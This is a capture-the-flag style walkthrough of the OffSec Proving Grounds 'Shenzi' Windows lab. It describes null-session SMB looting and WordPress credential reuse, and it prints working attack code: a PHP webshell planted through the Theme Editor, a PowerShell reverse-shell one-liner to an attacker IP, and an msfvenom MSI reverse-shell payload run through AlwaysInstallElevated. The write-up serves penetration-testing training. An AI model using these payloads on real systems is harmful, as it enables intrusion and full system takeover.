---
title: "PG: Shenzi"
date: 2023-05-25
draft: false
os: "Windows"
difficulty: "Medium"
platform: "OffSec Proving Grounds"
aliases: ["/posts/offsec/shenzi/"]
tags:
  - offsec
  - proving-grounds
  - medium
  - windows
  - smb-null-session
  - wordpress
  - theme-editor-rce
  - alwaysinstallelevated
  - msi-payload
categories:
  - walkthrough
---

{{< box-info name="Shenzi" os="Windows" difficulty="Medium" ip="192.168.243.55" platform="OffSec Proving Grounds" >}}

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          FileZilla ftpd 0.9.41 beta
80/tcp   open  http         Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
445/tcp  open  microsoft-ds
3306/tcp open  mysql        MariaDB (host not allowed)
5040/tcp open  unknown
```
{{< /collapse >}}

Windows 10 box with an Apache/PHP stack on 80/443, FileZilla FTP, SMB, and a MariaDB that refuses remote connections. FTP rejects the obvious weak creds and MySQL is locked to localhost, so the two live doors are SMB and the web server.

### Port 445 - SMB

SMB allows a null/guest session. Mapping the shares surfaces a non-default `Shenzi` share that's world-readable:

```bash
smbmap -H 192.168.243.55 -u guest -p '' -R
```

Pull everything out of it with a null-session `smbclient`:

```bash
smbclient -N //192.168.243.55/Shenzi
smb: \> recurse
smb: \> prompt off
smb: \> mget *
```

Most of the loot is noise, but one config file leaks WordPress credentials — and the password format (`FeltHeadwallWight357`) screams OffSec-generated:

```
admin:FeltHeadwallWight357
```

### Port 80/443 - Web

The web root doesn't obviously advertise WordPress, so it's hiding on a path. Fuzzing with a `cewl`-generated wordlist works, but the fast path on OffSec is to just try the machine name:

```
https://192.168.243.55/shenzi/
```

That lands on the WordPress install the SMB creds belong to.

---

## Foothold

### WordPress Theme Editor RCE

Log into `wp-login.php` with `admin:FeltHeadwallWight357`. With admin access, the Appearance → Theme Editor turns into a code-execution primitive: overwrite a rarely-touched template in the active theme with a PHP webshell.

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

Drop that into `404.php` of the `twentytwenty` theme. Site Health → Info confirms the theme path, then hit the poisoned file directly:

```
https://192.168.243.55/shenzi/wp-content/themes/twentytwenty/404.php?cmd=whoami
```

Command execution confirmed. Upgrade to a full reverse shell with a PowerShell one-liner (listener on 80):

```powershell
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.45.244',80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Shell as the low-privileged web user.

---

## Privilege Escalation

### AlwaysInstallElevated

Running PowerUp / winPEAS flags the classic `AlwaysInstallElevated` misconfiguration — when both registry keys are set, any `.msi` runs as SYSTEM:

```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Both return `0x1`, so build an MSI reverse-shell payload:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.244 LPORT=443 -a x64 --platform Windows -f msi -o evil.msi
```

Upload it to the target and fire it through `msiexec` with a listener waiting:

```powershell
IWR http://192.168.45.244:443/evil.msi -UseBasicParsing -OutFile evil.msi
msiexec /quiet /i evil.msi
```

The installer executes with elevated privileges and the callback lands as `nt authority\system`.

---

## Proof

Both flags and SYSTEM from a single shell:

![SYSTEM proof — root proof.txt, shenzi local.txt, and whoami returning nt authority\system](/images/shenzi/proof.png)

---

## Key Takeaways

{{< callout type="note" >}}
- Always enumerate SMB with a null/guest session — a single readable non-default share (`Shenzi`) handed over the WordPress admin password.
- OffSec loves hiding web apps on a path named after the box. When the root looks empty, try `/<machine-name>/` before burning time on a full dir-bust.
- WordPress admin access is RCE: the Theme Editor lets you plant a PHP webshell in any template (`404.php`) of the active theme.
- When both `AlwaysInstallElevated` keys are `0x1`, an `msfvenom` MSI run via `msiexec /i` is a straight shot to SYSTEM.
{{< /callout >}}
